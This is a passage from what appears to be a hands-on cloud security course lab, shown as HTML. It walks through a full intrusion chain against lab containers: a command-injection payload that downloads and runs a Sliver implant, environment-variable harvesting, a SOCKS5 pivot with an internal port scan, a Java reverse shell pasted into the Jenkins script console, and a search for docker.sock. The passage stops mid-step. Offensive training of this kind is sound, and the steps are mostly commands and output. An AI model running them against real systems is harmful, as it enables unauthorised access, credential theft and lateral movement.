<p>Use the <mark class="critic">python</mark> MATE window to serve the implant with <code>python</code>.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>You can also open a terminal by pressing <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-alt">Alt</kbd><span>+</span><kbd class="key-t">T</kbd></span>. Using the <code>Terminal | Set Title ...</code> of the menu call this window <code>Python</code>.</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">cd</span> /home/sec588/Coursefiles/workdir
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>python3 -m <span class="s1">&#39;http.server&#39;</span> <span class="m">9998</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code>sec588:slingshot:workdir$ python3 -m <span class="s1">&#39;http.server&#39;</span> <span class="m">9998</span>
Serving HTTP on <span class="m">0</span>.0.0.0 port <span class="m">9998</span> <span class="o">(</span>http://0.0.0.0:9998/<span class="o">)</span> ...
</code></pre></div>
</details>
</div>
</li>
<li>
<p>What we need to know is how to move this file; you may have a few options. <code>curl</code>, <code>wget</code>, or simply <code>nc</code>. </p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Do this from the <mark class="critic">working</mark> window</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>curl <span class="s2">&quot;http://vulnapp.local:8000/ping.php?form_submitted=1&amp;ping=127.0.0.1%3Bwhich+curl&quot;</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:~$ </span>curl <span class="s2">&quot;http://vulnapp.local:8000/ping.php?form_submitted=1&amp;ping=127.0.0.1%3Bwhich+curl&quot;</span>
<span class="go">&lt;html&gt;</span>
<span class="go">  &lt;head&gt; </span>

<span class="go">  &lt;/head&gt;</span>
<span class="go">  &lt;script&gt;</span>
<span class="go">    function encode() {</span>
<span class="go">      const str = document.getElemntById(&quot;ping&quot;).value;</span>
<span class="go">      console.log(str)</span>
<span class="go">      return str;</span>
<span class="go">    }</span>
<span class="go">&lt;/script&gt;</span>

<span class="go">  &lt;form class=&quot;form-inline&quot; action=&quot;&quot; method=&quot;GET&quot;&gt;</span>
<span class="go">    &lt;label for=&quot;ping&quot;&gt;What do you want to ping?&lt;/label&gt;</span>
<span class="go">    &lt;input type=&quot;ping&quot; id=&quot;ping&quot; placeholder=&quot;127.0.0.1&quot; name=&quot;ping&quot;&gt;</span>
<span class="go">    &lt;input type=&quot;hidden&quot; name=&quot;form_submitted&quot; value=&quot;1&quot; /&gt;</span>
<span class="go">    &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;</span>
<span class="go">  &lt;/form&gt;</span>
<span class="go">&lt;pre&gt;</span>
<span class="go">        Running ping -c 2 127.0.0.1;id: </span>
<span class="go">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span>
<span class="go">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms</span>
<span class="go">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms</span>

<span class="go">--- 127.0.0.1 ping statistics ---</span>
<span class="go">2 packets transmitted, 2 received, 0% packet loss, time 1031ms</span>
<span class="go">rtt min/avg/max/mdev = 0.027/0.031/0.036/0.004 ms</span>
<span class="hll"><span class="go">/usr/bin/curl</span>
</span><span class="go">Done Running    &lt;/pre&gt;</span>
<span class="go">&lt;/html&gt;</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>We have the <code>curl</code> binary. Let's move the binary over the container and run it in a directory allowing us to execute commands, for example, <code>/tmp</code>. We also want to make the binary executable and execute it.</p>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Defender tip: Do you need this many binaries in a container?</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This particular lab step will require a few things that you will need to be aware of.
+ Do this from the <mark class="critic">working</mark> window
+ Remember to do this with the IP address of your host, you will need to change it in several places, the one we highlight is <mark class="critic">192.168.4.9</mark> which is not necessarily yours. 
+ If you did this correctly, the output of $IP will reflect your IP.</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="nv">$IP</span>
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>curl <span class="s2">&quot;http://vulnapp.local:8000/ping.php?form_submitted=1&amp;ping=127.0.0.1%3Bcurl+http://</span><span class="nv">$IP</span><span class="s2">:9998/nginx+--output+/tmp/nginx%3Bchmod+777+/tmp/nginx%3B/tmp/nginx%26&quot;</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<p><div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:workdir$ </span>curl curl <span class="s2">&quot;http://vulnapp.local:8000/ping.php?form_submitted=1&amp;ping=127.0.0.1%3Bcurl+http://</span><span class="nv">$IP</span><span class="s2">:9998/nginx+--output+/tmp/nginx%3Bchmod+777+/tmp/nginx%3B/tmp/nginx%26&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span> 

  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="kd">function</span> <span class="nx">encode</span><span class="p">()</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">str</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElemntById</span><span class="p">(</span><span class="s2">&quot;ping&quot;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span>
      <span class="k">return</span> <span class="nx">str</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-inline&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;GET&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;ping&quot;</span><span class="p">&gt;</span>What do you want to ping?<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;ping&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;ping&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;127.0.0.1&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;ping&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;form_submitted&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>Submit<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
        Running ping -c 2 127.0.0.1;curl http://192.168.4.9:9998/nginx --output /tmp/nginx;chmod 777 /tmp/nginx;/tmp/nginx<span class="err">&amp;</span>: 
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.097 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1008ms
rtt min/avg/max/mdev = 0.043/0.070/0.097/0.027 ms
</code></pre></div></p>
</details>
</div>
<p>In the <code>sliver</code> window you should see a new connected session. For example:</p>
<p><code>[*] Session 0c2551db PROPOSED_DECREASE - 172.18.0.4:37186 (2756fe0bb429) - linux/amd64 - Tue, 27 Jun 2023 23:24:36 UTC</code></p>
</li>
<li>
<p>To interact with Sliver Sessions you need to use the <code>use</code> command. Sliver only shows the first 8 characters of the session ID and not the entire GUID. You can use tab completion to resolve it.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>To use tab completion use the <span class="keys"><kbd class="key-tab">Tab</kbd></span> key. Additional note is that each and every Session ID is unique such that in our example <code>0c2551db</code> will be different from your example.</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Do this from within <code>sliver</code> in the <code>sliver</code> Window.</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<p><code>use 0c2551d</code><span class="keys"><kbd class="key-tab">Tab</kbd></span></p>
<div class="admonition abstract">
<p class="admonition-title">Expected Results</p>
<p><code>console
sliver &gt; use 0c2551db-9382-41f0-ac1f-42ceea6f09d3</code></p>
</div>
</div>
<p>Let's now look at the file system so you can see our binary, we can do this with <code>sliver</code> without needing an interactive shell.</p>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>ls /tmp
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="go">sliver (PROPOSED_DECREASE) &gt; ls /tmp</span>

<span class="go">/tmp (2 items, 29.5 MiB)</span>
<span class="go">========================</span>
<span class="go">-rwxrwxrwx  nginx  14.6 MiB  Tue Jun 27 23:24:36 +0000 2023</span>
</code></pre></div>
</details>
</div>
<p>We may also want to see Environment Variables that can give us hints to other systems. In many systems environment variables will give us:</p>
<ol>
<li>Other targets that are in the same system</li>
<li>Authentication Key Material</li>
<li>Database  or other types of credentials with locations</li>
</ol>
<p>Let's use the built in <code>env</code> command in <code>sliver</code> to see the environment variables on the container.</p>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>env
</code></pre></div>
<details class="abstract">
<summary>Extracted Results</summary>
<div class="highlight"><pre><span></span><code><span class="go">sliver (PROPOSED_DECREASE) &gt; env</span>
<span class="go">HOSTNAME=2756fe0bb429</span>
<span class="go">PHP_VERSION=8.2.7</span>
<span class="go">APACHE_CONFDIR=/etc/apache2</span>
<span class="go">PHP_INI_DIR=/usr/local/etc/php</span>
<span class="go">GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC</span>
<span class="go">PHP_LDFLAGS=-Wl,-O1 -pie</span>
<span class="go">PWD=/var/www/html</span>
<span class="go">APACHE_LOG_DIR=/var/log/apache2</span>
<span class="go">LANG=C</span>
<span class="go">PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0</span>
<span class="go">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span>
<span class="go">PHPIZE_DEPS=autoconf        dpkg-dev        file        g++         gcc         libc-dev        make        pkg-config      re2c</span>
<span class="go">PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz</span>
<span class="go">APACHE_RUN_GROUP=www-data</span>
<span class="go">APACHE_LOCK_DIR=/var/lock/apache2</span>
<span class="go">SHLVL=1</span>
<span class="go">PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64</span>
<span class="go">APACHE_RUN_DIR=/var/run/apache2</span>
<span class="go">APACHE_ENVVARS=/etc/apache2/envvars</span>
<span class="go">APACHE_RUN_USER=www-data</span>
<span class="go">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
<span class="go">PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc</span>
<span class="go">PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64</span>
<span class="go">_=/usr/bin/env</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>The <code>sliver</code> system also has a <code>socks5</code> proxy that we can use to pivot to other hosts on the system. To do this we need to start the <code>socks5</code> proxy and we will then configure <code>proxychains</code> to perform the connectivity between a localhost and the remote system.</p>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>socks5 start
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="go">sliver (PROPOSED_DECREASE) &gt; socks5 start</span>

<span class="go">[*] Started SOCKS5 127.0.0.1 1081  </span>
<span class="go">⚠️  In-band SOCKS proxies can be a little unstable depending on protocol</span>
</code></pre></div>
</details>
</div>
<p>Start a new Window called <mark class="critic">Working2</mark> as your original <mark class="critic">Working</mark> window will be frozen with the sliver implant. From <mark class="critic">Working2</mark> run the following commands. </p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>In some cases your docker network may not be 172.18.0.0/24. You can check with the command injection we have in teh vulnerable web server. Try injecting a command like <code>hostname -I</code>!</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>proxychains naabu -host <span class="m">172</span>.18.0.0/24 -port <span class="m">80</span>,8000,8080,50000,9000,5001,443,3001,6379
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:/$ </span>proxychains naabu -host <span class="m">172</span>.18.0.0/24 -port <span class="m">80</span>,8000,8080,50000,9000,5001,443,3001,6379 
<span class="go">[proxychains] config file found: /etc/proxychains4.conf</span>
<span class="go">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span>
<span class="go">[proxychains] DLL init: proxychains-ng 4.16</span>

<span class="go">                  __</span>
<span class="go">  ___  ___  ___ _/ /  __ __</span>
<span class="go"> / _ \/ _ \/ _ \/ _ \/ // /</span>
<span class="go">/_//_/\_,_/\_,_/_.__/\_,_/</span>

<span class="go">        projectdiscovery.io</span>

<span class="go">[INF] Current naabu version 2.1.6 (latest)</span>
<span class="go">[INF] Running CONNECT scan with non root privileges</span>
<span class="go">[INF] Found 2 ports on host 172.18.0.5 (172.18.0.5)</span>
<span class="go">172.18.0.5:8000</span>
<span class="go">172.18.0.5:9000</span>
<span class="go">[INF] Found 1 ports on host 172.18.0.8 (172.18.0.8)</span>
<span class="go">172.18.0.8:5001</span>
<span class="go">[INF] Found 1 ports on host 172.18.0.2 (172.18.0.2)</span>
<span class="go">172.18.0.2:8080</span>
<span class="go">[INF] Found 2 ports on host 172.18.0.11 (172.18.0.11)</span>
<span class="go">172.18.0.11:443</span>
<span class="go">172.18.0.11:80</span>
<span class="go">[INF] Found 3 ports on host 172.18.0.1 (172.18.0.1)</span>
<span class="go">172.18.0.1:8000</span>
<span class="go">172.18.0.1:80</span>
<span class="go">172.18.0.1:443</span>
<span class="go">[INF] Found 1 ports on host 172.18.0.4 (172.18.0.4)</span>
<span class="go">172.18.0.4:80</span>
<span class="go">[INF] Found 2 ports on host 172.18.0.7 (172.18.0.7)</span>
<span class="go">172.18.0.7:80</span>
<span class="go">172.18.0.7:443</span>
<span class="go">[INF] Found 2 ports on host 172.18.0.3 (172.18.0.3)</span>
<span class="go">172.18.0.3:50000</span>
<span class="go">172.18.0.3:8080</span>
<span class="go">[INF] Found 1 ports on host 172.18.0.9 (172.18.0.9)</span>
<span class="go">172.18.0.9:6379</span>
<span class="go">[INF] Found 1 ports on host 172.18.0.10 (172.18.0.10)</span>
<span class="go">172.18.0.10:3001</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>We can use a wordlist to do DNS enumeration from within the cluster environment, but instead let's do a slightly different manuver. Instead what we are going to do is use curl since we know some of these names. We could use <code>http://ip:port</code> but to expedite things, let's use a simple <code>jenkins:8080</code>.</p>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>proxychains curl http://jenkins:8080
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:/$ </span>proxychains curl http://jenkins:8080
<span class="go">[proxychains] config file found: /etc/proxychains4.conf</span>
<span class="go">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span>
<span class="go">[proxychains] DLL init: proxychains-ng 4.16</span>
<span class="go">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  jenkins:8080  ...  OK</span>
<span class="go">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#39;refresh&#39; content=&#39;1;url=/login?from=%2F&#39;/&gt;&lt;script&gt;window.location.replace(&#39;/login?from=%2F&#39;);&lt;/script&gt;&lt;/head&gt;&lt;body style=&#39;background-color:white; color:white;&#39;&gt;</span>


<span class="go">Authentication required</span>
<span class="go">&lt;!--</span>
<span class="go">--&gt;</span>

<span class="go">&lt;/body&gt;&lt;/html&gt;                                                                                                                                                                               </span>
</code></pre></div>
</details>
</div>
<p>Interestingly enough, what we have is <code>jenkins</code> and we also have a url to login. Most of the newer <code>jenkins</code> systems will have this. We could use a password bruteforcing tool such as BurpSuite to go after this system. </p>
</li>
<li>
<p>Jenkins is an interesting target when it is within a container. How can <code>jenkins</code> produce a container when jenkins itself is in a container? This process is called <code>docker</code> in <code>docker</code> and it introduces a new vulnerability. The vulnerability is that the <code>docker.sock</code> is now exposed from within a container. Most <code>docker.sock</code> sockets are not secured by any authentication making this a very interesting target. Recall some of the vulnerabilities.</p>
<ol>
<li><code>docker.sock</code> has no authentication</li>
<li>Docker's daemon process is running as root, any container executed can have full root permissions on the box</li>
<li>An attacker can abuse this to gain full root access on a host</li>
</ol>
<p>The login to this system would need to be bruteforce in order to obtain access. Password Bruteforcing with tools like Burp are something we do quite often, instead let's focus on the attack vector. To login into Jenkins use the following username and password:</p>
<ul>
<li>Username: <strong>sec588</strong></li>
<li>Password: <strong>slingshotslingshot</strong></li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Remember the IP address here has to change from the IP Address listed to the IP address of your VM.</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>firefox <span class="s2">&quot;http://jenkins.local:8000/login?from=%2Fmanage%2Fscript&quot;</span>
</code></pre></div>
</div>
<p><img alt="Jenkins Login" class="noborder" src="../img/jenkins1.png" /></p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Please make note that sometimes when you login the redirect takes you to the wrong place, for example:</p>
<p><img alt="Jenkins 3" class="noborder" src="../img/jenkins3.png" /></p>
<p>Change the URL at the top to <strong><a href="http://jenkins.local">http://jenkins.local</a>:<mark class="critic">8000</mark>/manage/script</strong> to see the page:</p>
<p><img alt="Jenkins 4" class="noborder" src="../img/jenkins4.png" /></p>
</div>
</li>
<li>
<p>Open another Terminal, this terminal will be another <code>Shell Catcher</code> where we can use a netcat listener. Let's call this Window <code>Shell Catcher</code>.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>You can also open a terminal by pressing <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-alt">Alt</kbd><span>+</span><kbd class="key-t">T</kbd></span>. Using the <code>Terminal | Set Title ...</code> of the menu call this window <code>Shell Catcher</code>.</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>nc -vnlp <span class="m">9997</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588:slingshot:~$ </span>nc -nvlp <span class="m">9997</span>
<span class="go">Listening on 0.0.0.0 9997</span>
</code></pre></div>
</details>
</div>
<p>Now modify this below to reflect your IP address. The script below was created by Chris Frohoff and can be found on <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">Github</a></p>
<div class="admonition cmd">
<p class="admonition-title">Form</p>
<div class="highlight"><pre><span></span><code><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s">&quot;<mark class="critic">192.168.4.9</mark>&quot;</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">9997</span><span class="p">;</span>
<span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">;</span>
<span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="na">redirectErrorStream</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="na">start</span><span class="p">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">);</span><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">.</span><span class="na">isClosed</span><span class="p">()){</span><span class="k">while</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">po</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">si</span><span class="p">.</span><span class="na">read</span><span class="p">());</span><span class="n">so</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">po</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span><span class="k">try</span> <span class="p">{</span><span class="n">p</span><span class="p">.</span><span class="na">exitValue</span><span class="p">();</span><span class="k">break</span><span class="p">;}</span><span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">){}};</span><span class="n">p</span><span class="p">.</span><span class="na">destroy</span><span class="p">();</span><span class="n">s</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
</code></pre></div>
</div>
<p><img alt="Jenkins 2" class="noborder" src="../img/jenkins2.png" /></p>
<p>Once you click run, return to the screen that has the <strong>nc</strong> and see if you see a message that says <strong>Connection Received</strong>.</p>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>If you run the <code>id</code> command after you see the <code>Connection received</code> banner you should be able to run commands. A raw <code>netcat</code> shell like this does not reflect a prompt and this may confuse you.</p>
</div>
</li>
<li>
<p>Let's now upgrade our shell by using <code>sliver</code> to get more access to the host. To do this we can run the following commands below to do this. Do this from the new shell you got.</p>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>Remember to change the IP address below to reflect your host IP.</p>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Do this from the <code>Shell Catcher</code> Window</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span> <span class="nv">IP</span><span class="o">=</span><mark class="critic">192.168.4.9</mark>
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>curl http://<span class="si">${</span><span class="nv">IP</span><span class="si">}</span>:9998/nginx --output /tmp/nginx<span class="p">;</span>chmod <span class="m">777</span> /tmp/nginx<span class="p">;</span>/tmp/nginx <span class="p">&amp;</span>
</code></pre></div>
</div>
<p>At this point we should have a new shell from <code>sliver</code> in our example, recall each one is unique, so our example will be different from yours.</p>
<p>Before leaving this window. Hit <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-c">C</kbd></span> and stop the <code>nc</code> process. We will then need to restart it, as we will be receiving a new shell soon.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>nc -nvlp <span class="m">9997</span>
</code></pre></div>
<details class="abstract">
<summary>Example Results</summary>
<div class="highlight"><pre><span></span><code>sec588@slingshot ~/Coursefiles/workdir $ nc -nvlp <span class="m">9997</span>
Listening on <span class="m">0</span>.0.0.0 <span class="m">9997</span>
Connection received on <span class="m">172</span>.18.0.7 <span class="m">41956</span>
id
<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
<span class="nb">export</span> <span class="nv">IP</span><span class="o">=</span><mark class="critic">192.168.4.9</mark>
curl http://<span class="si">${</span><span class="nv">IP</span><span class="si">}</span>:9998/nginx --output /tmp/nginx<span class="p">;</span>chmod <span class="m">777</span> /tmp/nginx<span class="p">;</span>/tmp/nginx <span class="p">&amp;</span>
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                Dload  Upload   Total   Spent    Left  Speed
<span class="m">100</span> <span class="m">14</span>.8M  <span class="m">100</span> <span class="m">14</span>.8M    <span class="m">0</span>     <span class="m">0</span>  <span class="m">25</span>.5M      <span class="m">0</span> --:--:-- --:--:-- --:--:-- <span class="m">25</span>.5M
<mark class="critic">^C</mark>
sec588@slingshot ~/Coursefiles/workdir $ nc -nvlp <span class="m">9997</span>
Listening on <span class="m">0</span>.0.0.0 <span class="m">9997</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>In <code>sliver</code> session we should have a new sessions that denoted by the string below. We can interact with the system with the <code>use</code> command just like before.</p>
<p><code>[*] Session abcfdd98 PROPOSED_DECREASE - 192.168.4.205:58670 (0222610d7c9e) - linux/amd64 - Wed, 28 Jun 2023 01:04:31 UTC</code></p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<p><code>bash
use abcfd</code><span class="keys"><kbd class="key-tab">Tab</kbd></span></p>
<details class="abstract">
<summary>Expected Results</summary>
<p>```console
sliver (PROPOSED_DECREASE) &gt; use abcfdd98-7e1b-4b9a-8454-14cf479aa180</p>
<p>[*] Active session PROPOSED_DECREASE (abcfdd98-7e1b-4b9a-8454-14cf479aa180)
```</p>
</details>
</div>
<p>Now let's use the <code>ls</code> command to make sure our implant is working correctly.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>ls
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="go">sliver (PROPOSED_DECREASE) &gt; ls</span>

<span class="go">/tmp (4 items, 17.9 MiB)</span>
<span class="go">========================</span>
<span class="go">drwxr-xr-x  hsperfdata_root                                   &lt;dir&gt;     Wed Jun 28 00:48:45 +0000 2023</span>
<span class="go">drwx------  jetty-0_0_0_0-8080-war-_-any-1577770271696201865  &lt;dir&gt;     Wed Jun 28 00:48:47 +0000 2023</span>
<span class="go">-rwxrwxrwx  nginx                                             14.6 MiB  Wed Jun 28 01:04:31 +0000 2023</span>
<span class="go">-rw-r--r--  winstone7225790913945196749.jar                   3.2 MiB   Wed Jun 28 00:48:46 +0000 2023</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>While it's not ideal in Windows to perform "shell" commands typically Linux systems in containers will not have EDR tools that can detect simple shell outputs. We can just use <code>shell</code> to interact with the system and do this without too much worry. Let's do that and install <code>jq</code>. We can install <code>jq</code> as <code>jenkins</code> is running as <code>UID 0</code>.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>shell
</code></pre></div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>find ./ -name docker.sock
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>apt install jq -y
</code></pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The errors in the ./proc directories will be completely random based on the system that your on. You can safely ignore these.</p>
</div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="go">sliver (PROPOSED_DECREASE) &gt; shell </span>

